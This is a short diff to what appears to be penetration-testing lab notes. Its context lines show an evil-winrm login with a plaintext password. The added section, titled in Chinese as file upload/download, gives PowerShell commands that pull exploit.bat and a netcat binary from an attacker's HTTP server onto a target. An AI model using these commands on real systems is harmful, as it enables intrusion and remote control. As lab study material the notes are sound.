@@ -81,3 +81,13 @@ gem install evil-winrm
 evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'
 ```
 
+# 文件上传/下载
+
+```
+ iwr http://10.10.14.52:8000/exploit.bat -Outfile C:\Temp\exploit.bat
+```
+
+```
+powershell wget http://10.10.16.3:8000/nc64.exe -outfile nc.exe
+```
+
